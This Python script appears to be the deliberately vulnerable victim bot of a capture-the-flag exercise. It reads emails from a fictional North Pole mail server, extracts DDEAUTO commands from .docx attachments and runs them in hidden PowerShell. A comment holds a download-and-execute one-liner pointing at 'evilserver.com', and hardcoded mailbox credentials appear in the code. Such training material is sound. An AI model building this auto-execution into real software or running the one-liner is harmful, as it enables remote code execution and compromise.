#!/usr/bin/env python
from zipfile import ZipFile
from xml.dom import minidom
import requests
import email
import imaplib
import xml.etree.ElementTree as et
import re
import os
import sys
import shutil
import tempfile
import linecache
import subprocess
import glob
import time
import random
import threading
from urllib.parse import unquote

def printException():
    exc_type, exc_obj, tb = sys.exc_info()
    f = tb.tb_frame
    lineno = tb.tb_lineno
    filename = f.f_code.co_filename
    linecache.checkcache(filename)
    line = linecache.getline(filename, lineno, f.f_globals)
    print('\nEXCEPTION IN ({}, LINE {} "{}"): {}\n'.format(filename, lineno, line.strip(), exc_obj))

def get_payload(docxfile):
    try:
        tmpd = tempfile.mkdtemp()
        ZipFile(docxfile).extractall(path=tmpd, pwd=None)
        root_path = os.path.join(tmpd ,'word')
        for infile in glob.glob(os.path.join(root_path, '','*.xml')):
            print(infile)
            if infile.endswith('document.xml'):
                payload = open(infile,'r').read()
                shutil.rmtree(tmpd)
                return payload
    except:
        printException()

#Set-ExecutionPolicy Unrestricted 
def command_executor(payload):
    try:
        tmpd = tempfile.mkdtemp()
        thefilename = tmpd + '\\' + ''.join(random.choice('qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM1234567890') for i in range(20)) + '.ps1'
        tf = open(thefilename, 'w'); tf.write(payload); tf.close()
        pscommand = "$app = Start-Process -PassThru -WindowStyle hidden -FilePath 'powershell.exe' -ArgumentList '-noprofile -noexit -ExecutionPolicy Bypass -command "+thefilename+"'; start-sleep -seconds 300; $app.Kill()"
        outerr = subprocess.Popen(pscommand, shell=True, executable="C:\\Windows\\SysWOW64\\WindowsPowerShell\\v1.0\\powershell.exe", stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        time.sleep(300)
        shutil.rmtree(tmpd)
        return
    except:
        printException()


#cmd.exe /c powershell.exe -w hidden $e=(New-Object System.Net.WebClient).DownloadString("http://evilserver.com/sp.base64");powershell -e $e
def get_command(payload):
    try:
        joined = ''.join( re.findall(r'\<w\:instrText.{0,40}?\>(.+?)<\/w\:instrText\>',payload) )
        command =re.sub(r'\s{0,6}[\'\"]\s{0,6}\/[cCkK]', ' /c', re.findall(r'((?:powershell|powershell.exe|cmd.exe|cmd|python|python.exe).*)',joined)[0].replace('\\\\','\\').replace('\\"','"').replace("\\'","'")).strip()
        while command[-1:] == '"' or command[-1:] == "'":
            command = command[:-1]
        print(command)
        return command
    except:
        printException()


def execute_dde(docxfile):
    payload = get_payload(docxfile)
    if bool(payload):
        if bool(re.search(r'DDEAUTO', payload, re.IGNORECASE)):
            command = get_command(payload)
            if bool(command):
                t = threading.Thread(target=command_executor, args=[command]); t.daemon == False; t.start()

class FetchEmail():

    connection = None
    error = None

    def __init__(self, mail_server, username, password):
        self.connection = imaplib.IMAP4(mail_server)
        self.connection.login(username, password)
        self.connection.select(readonly=False) # so we can mark mails as read

    def close_connection(self):
        """
        Close the connection to the IMAP server
        """
        self.connection.close()

    def save_attachment(self, msg):
        """
        Given a message, save its attachments to the specified
        download folder (default is /tmp)

        return: file path to attachment
        """
        download_folder = tempfile.mkdtemp()
        att_path = False
        for part in msg.walk():
            if part.get_content_maintype() == 'multipart':
                continue
            if part.get('Content-Disposition') is None:
                continue

            filename = part.get_filename()
            att_path = os.path.join(download_folder, filename)

            if not os.path.isfile(att_path):
                fp = open(att_path, 'wb')
                fp.write(part.get_payload(decode=True))
                fp.close()
        return att_path

    def fetch_unread_messages(self):
        """
        Retrieve unread messages
        """
        emails = []
        (result, messages) = self.connection.search(None, 'UnSeen')
        if result == "OK":
            for message in messages:
                try: 
                    ret, data = self.connection.fetch(message.decode('utf-8'),'(RFC822)')
                except:
                    #printException()
                    print("No new emails to read.")
                    self.close_connection()
                    return False
                msg = email.message_from_string(data[0][1].decode('utf-8'))
                if isinstance(msg, str) == False:
                    emails.append(msg)
                response, data = self.connection.store(message, '+FLAGS','\\Seen')

            return emails

        self.error = "Failed to retreive emails."
        return emails

    def parse_email_address(self, email_address):
        """
        Helper function to parse out the email address from the message

        return: tuple (name, address). Eg. ('John Doe', 'jdoe@example.com')
        """
        return email.utils.parseaddr(email_address)

def download_attachment(anemail):
    try:
        urls = re.findall(r'(http\:\/\/(?:mail\.northpolechristmastown\.com|10\.142\.0\.5)\/attachments\/.+?.docx)',anemail)
        tmpd = tempfile.mkdtemp()
        for url in urls:
            filename = tmpd + '\\' +unquote(unquote(url)).split('/')[-1]
            tf = open(filename, 'wb'); tf.write(requests.get(url).content); tf.close()
            execute_dde(filename)
        shutil.rmtree(tmpd)
    except:
        printException()


def clear_webroot():
    while True:
        try:
            a = list(sorted(os.listdir("C:\\inetpub\\wwwroot\\")))
            a.remove('aspnet_client')
            a.remove('iisstart.htm')
            a.remove('iisstart.png')
            for file_name in a:
                os.remove("C:\\inetpub\\wwwroot\\"+file_name)
        except:
            pass
        time.sleep(1800)


if __name__ == "__main__":
    u = threading.Thread(target=clear_webroot); u.daemon == True; u.start()
    srverAddress = '10.142.0.5'
    #srverAddress = '35.185.115.185'
    user = 'alabaster.snowball@northpolechristmastown.com'
    passw = 'power instrument gasoline film'
    while True:
        try:
            grabber = FetchEmail(srverAddress, user, passw)
            emails = grabber.fetch_unread_messages()
            if bool(emails):
                    for anemail in emails:
                        theemail = anemail.as_string().replace('=\n','')
                        print(theemail)
                        if 'recipe' in theemail.lower() and 'gingerbread' in theemail.lower() and 'cookie' in theemail.lower():
                            attachment = grabber.save_attachment(anemail)
                            if bool(attachment):
                                if attachment.strip().endswith('.docx'):
                                    print('Found a docx')
                                    execute_dde(attachment)
                                    shutil.rmtree(  '\\'.join( attachment.split('\\')[:-1] )  )
                                    continue
                            #EX =   http://mail.northpolechristmastown.com/attachments/ngixcRVQtbouR9YIufFSPaOtUt4VahI2sagPYeTC0VsAFSjbR2__ewa4.docx
                            if bool(re.search(r'http\:\/\/(?:mail\.northpolechristmastown\.com|10\.142\.0\.5)\/attachments\/.+?.docx',theemail)):
                                print('Found a link')
                                download_attachment( theemail )
                                continue
        except Exception as e:
            printException()
        time.sleep(30)

        